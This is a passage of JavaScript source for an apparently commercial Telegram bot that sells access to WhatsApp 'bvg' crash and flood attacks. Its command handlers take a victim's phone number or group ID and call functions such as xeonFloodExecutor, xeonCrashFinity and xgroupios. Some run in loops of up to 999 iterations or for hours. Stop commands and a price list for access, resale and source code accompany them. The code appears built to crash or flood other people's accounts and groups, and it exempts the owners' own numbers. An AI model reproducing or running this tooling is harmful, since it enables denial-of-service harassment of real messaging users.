  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /crashjam: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /crashjam +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /crashjam: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /crashjam: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /crashjam: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /crashjam: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
          await prankGreet(formattedNumber, userNumber, chatId, botInstance);
  } catch (error) {
    console.error(`Error in /crashjam for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /crashjam: ${error.message}`);
  }
});*/



botInstance.onText(/\/bewodj(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /ioscunt raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /ioscunt input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /ioscunt: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /ioscunt +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /ioscunt: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /ioscunt: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /ioscunt: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /ioscunt: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
          await prankGreet2(formattedNumber, userNumber, chatId, botInstance);
  } catch (error) {
    console.error(`Error in /ioscunt for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /ioscunt: ${error.message}`);
  }
});

botInstance.onText(/\/stopcrashjam(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;
    
    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);
    
    if (!checkRateLimit(senderId, chatId)) return;
    
    // NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

    const userNumber = db.userNumbers[senderId];
    if (!userNumber) {
      return botInstance.sendMessage(chatId, "❌ No linked WhatsApp number found.");
    }

    const targetInput = match[1]?.trim();
    const dashboard = userPrankDashboards.get(chatId);

    if (targetInput) {
      // ────────────────────────────────
      // STOP SPECIFIC TARGET
      // ────────────────────────────────
      const targetJid = targetInput.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
      const key = `${userNumber}:${targetJid}`;
      const ctrl = activePrankGreets.get(key);

      if (!ctrl || ctrl.type !== 'crashjam') {  // Added type check
        return botInstance.sendMessage(chatId, `No active crashjam found for ${targetInput}`);
      }

      // Mark as stopped
      ctrl.stopFlag = true;

      const count = dashboard?.pranks.get(targetJid)?.count || 0;

      // Delete current dashboard (if exists)
      if (dashboard?.messageId) {
        try {
          await botInstance.deleteMessage(chatId, dashboard.messageId);
          dashboard.messageId = null;
        } catch (err) {
          // silent fail - message might already be gone
        }
      }

      // Send only this one message
      await botInstance.sendMessage(chatId, 
        `crashjam stopped for ${targetInput}.\nTotal sent: ${count}`,
        { parse_mode: 'Markdown' }
      );

      // Remove from dashboard
      if (dashboard) {
        dashboard.pranks.delete(targetJid);
      }

      // If still other pranks running → send fresh dashboard
      if (dashboard && dashboard.pranks.size > 0) {
        await updateDashboard(botInstance, dashboard, 'live', null, true); // true = force new send
      }
      // If no pranks left → do nothing extra

    } else {
      // ────────────────────────────────
      // STOP ALL (only for 'crashjam' type)
      // ────────────────────────────────
      let stoppedCount = 0;
      const summaryLines = [];

      // Collect info before clearing
      for (const [key, ctrl] of activePrankGreets.entries()) {
        if (key.startsWith(userNumber + ':') && ctrl.type === 'crashjam') {  // Added type check
          ctrl.stopFlag = true;
          stoppedCount++;

          const target = key.split(':')[1];
          const cleanTarget = target.replace(/@s.whatsapp.net$/, '');
          const count = dashboard?.pranks.get(target)?.count || 0;
          summaryLines.push(`Target: ${cleanTarget}\nTotal bvg sent: ${count}\n`);
        }
      }

      if (stoppedCount === 0) {
        return botInstance.sendMessage(chatId, "No active crashjam found.");
      }

      // Build and send the ONLY message
      let finalText = `🏁 All crashjam stopped by command.\nStopped ${stoppedCount} target.\n\n`;
      finalText += summaryLines.join('\n');

      await botInstance.sendMessage(chatId, finalText, { parse_mode: 'Markdown' });

      // Clear everything silently
      if (dashboard) {
        // Only clear 'crashjam' entries
        for (const [t, d] of dashboard.pranks) {
          if (d.type === 'crashjam') dashboard.pranks.delete(t);
        }
        if (dashboard.messageId) {
          botInstance.deleteMessage(chatId, dashboard.messageId).catch(() => {});
          dashboard.messageId = null;
        }
      }
    }
  });

  botInstance.onText(/\/stopioscunt(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;
    
    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);
    
    if (!checkRateLimit(senderId, chatId)) return;
    
    // NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

    const userNumber = db.userNumbers[senderId];
    if (!userNumber) {
      return botInstance.sendMessage(chatId, "❌ No linked WhatsApp number found.");
    }

    const targetInput = match[1]?.trim();
    const dashboard = userPrankDashboards.get(chatId);

    if (targetInput) {
      // ────────────────────────────────
      // STOP SPECIFIC TARGET
      // ────────────────────────────────
      const targetJid = targetInput.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
      const key = `${userNumber}:${targetJid}`;
      const ctrl = activePrankGreets.get(key);

      if (!ctrl || ctrl.type !== 'ioscunt') {
        return botInstance.sendMessage(chatId, `No active ioscunt found for ${targetInput}`);
      }

      // Mark as stopped
      ctrl.stopFlag = true;

      const count = dashboard?.pranks.get(targetJid)?.count || 0;

      // Delete current dashboard (if exists)
      if (dashboard?.messageId) {
        try {
          await botInstance.deleteMessage(chatId, dashboard.messageId);
          dashboard.messageId = null;
        } catch (err) {
          // silent fail - message might already be gone
        }
      }

      // Send only this one message
      await botInstance.sendMessage(chatId, 
        `ioscunt stopped for ${targetInput}.\nTotal sent: ${count}`,
        { parse_mode: 'Markdown' }
      );

      // Remove from dashboard
      if (dashboard) {
        dashboard.pranks.delete(targetJid);
      }

      if (dashboard && dashboard.pranks.size > 0) {
        await updateDashboard(botInstance, dashboard, 'live', null, true); // true = force new send
      }

    } else {

      let stoppedCount = 0;
      const summaryLines = [];

      // Collect info before clearing
      for (const [key, ctrl] of activePrankGreets.entries()) {
        if (key.startsWith(userNumber + ':') && ctrl.type === 'ioscunt') { 
          ctrl.stopFlag = true;
          stoppedCount++;

          const target = key.split(':')[1];
          const cleanTarget = target.replace(/@s.whatsapp.net$/, '');
          const count = dashboard?.pranks.get(target)?.count || 0;
          summaryLines.push(`Target: ${cleanTarget}\nTotal bvg sent: ${count}\n`);
        }
      }

      if (stoppedCount === 0) {
        return botInstance.sendMessage(chatId, "No active ioscunt found.");
      }

      // Build and send the ONLY message
      let finalText = `🏁 All ioscunt stopped by command.\nStopped ${stoppedCount} target.\n\n`;
      finalText += summaryLines.join('\n');

      await botInstance.sendMessage(chatId, finalText, { parse_mode: 'Markdown' });

      // Clear everything silently
      if (dashboard) {
        for (const [t, d] of dashboard.pranks) {
          if (d.type === 'ioscunt') dashboard.pranks.delete(t);
        }
        if (dashboard.messageId) {
          botInstance.deleteMessage(chatId, dashboard.messageId).catch(() => {});
          dashboard.messageId = null;
        }
      }
    }
  });

  botInstance.onText(/\/stopall/, async (msg) => {  // No optional arg for specific target
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (msg.chat.type !== 'private') return;
  
  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);
  
  if (!checkRateLimit(senderId, chatId)) return;
  
  // NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return botInstance.sendMessage(chatId, "❌ No linked WhatsApp number found.");
  }

  // Get dashboard early so it's available in the loop
  const dashboard = userPrankDashboards.get(chatId);

  let stoppedCount = 0;
  const summaryLines = [];

  // Stop ALL active pranks (both crashjam and ioscunt)
  for (const [key, ctrl] of activePrankGreets.entries()) {
    if (key.startsWith(userNumber + ':')) {
      ctrl.stopFlag = true;
      stoppedCount++;

      const target = key.split(':')[1];
      const cleanTarget = target.replace(/@s.whatsapp.net$/, '');
      const count = dashboard?.pranks.get(target)?.count || 0;

      // Use nice display names
      const typeName = ctrl.type === 'crashjam' ? 'CrashJam' : 'iOS Cunt';

      summaryLines.push(`${typeName} Target: ${cleanTarget}\nTotal bvg sent: ${count}\n`);
    }
  }

  if (stoppedCount === 0) {
    return botInstance.sendMessage(chatId, "No active bvg / crash sessions found.");
  }

  // Build final confirmation message
  let finalText = `🏁 All active bvg sessions stopped by command.\nStopped ${stoppedCount} target(s).\n\n`;
  finalText += summaryLines.join('\n');

  await botInstance.sendMessage(chatId, finalText, { parse_mode: 'Markdown' });

  // Clean up dashboard
  if (dashboard) {
    dashboard.pranks.clear();
    if (dashboard.messageId) {
      botInstance.deleteMessage(chatId, dashboard.messageId).catch(() => {});
      dashboard.messageId = null;
    }
  }
});

botInstance.onText(/\/92ejjrjd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /delaymaker raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /delaymaker input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /delaymaker: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /delaymaker +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /delaymaker: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /delaymaker +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /delaymaker: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /delaymaker: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /delaymaker: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /delaymaker: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonFloodExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance, true)
    ]);
  } catch (error) {
    console.error(`Error in /delaymaker for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /delaymaker: ${error.message}`);
  }
});

botInstance.onText(/\/fheow9ej(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /crashfinity raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  console.log(`[DEBUG] /crashfinity input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /crashfinity: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /crashfinity +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /crashfinity: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /crashfinity: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /crashfinity: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /crashfinity: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇🏻
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });
        for (let i = 0; i < 3; i++) {
          await xeonCrashFinity(formattedNumber, userNumber, chatId, botInstance, true);
          await sleep(1000);
        }
  } catch (error) {
    console.error(`Error in /crashfinity for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /crashfinity: ${error.message}`);
  }
});

botInstance.onText(/\/listgc(?:\s(.+))?/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  try {
    await listGroups(userNumber, chatId, botInstance);
  } catch (error) {
    console.error(`Error in /listgc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /listgc: ${error.message}`);
  }
});

botInstance.onText(/\/rbwowknd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /nullgc raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /nullgc input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /nullgc: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID.\nExample: /nullgc 120363047626537xxx@g.us\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /nullgc: rawTarget = "${rawTarget}"`);

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /nullgc: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /nullgc: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to group...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    for (let i = 0; i < 1; i++) {
        await xeonGcNull(rawTarget, userNumber, chatId, botInstance, false);
        await sleep(1000);
    }
  } catch (error) {
    console.error(`Error in /nullgc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /nullgc: ${error.message}`);
  }
  });

botInstance.onText(/\/hddhdhwowjeow(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xsucidegc raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /xsucidegc input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xsucidegc: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID.\nExample: /xgroup 120363047626537xxx@g.us\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /xsucidegc: rawTarget = "${rawTarget}"`);

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /xsucidegc: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /xsucidegc: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to group...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
└────────────────────────┘`,
    });

    for (let i = 0; i < 5; i++) {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      try {
        await xeongroupinvi(rawTarget, userNumber, chatId, botInstance);
        await sleep(3000);
      } catch (error) {
        break; // Exit the loop on error to prevent spamming
      }
    }

  } catch (error) {
    console.error(`Error in /xsucidegc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xsucidegc: ${error.message}`);
  }
});

botInstance.onText(/\/beowdbfkks(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xgroupios raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /xgroupios input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xgroupios: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID.\nExample: /xgroup 120363047626537xxx@g.us\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /xsucidegc: rawTarget = "${rawTarget}"`);

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /xgroupios: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /xgroupios: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent bvg to group...
│ Target: ${rawTarget.replace('@g.us', '')}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    for (let i = 0; i < 999; i++) {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      try {
        await xgroupios(rawTarget, userNumber, chatId, botInstance);
      } catch (error) {
        break; // Exit the loop on error to prevent spamming
      }
    }

  } catch (error) {
    console.error(`Error in /xgroupios for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xgroupios: ${error.message}`);
  }
});

botInstance.onText(/\/groupmix(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /groupmix raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /groupmix input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /groupmix: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /groupmix 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /groupmix: Insufficient arguments provided`);
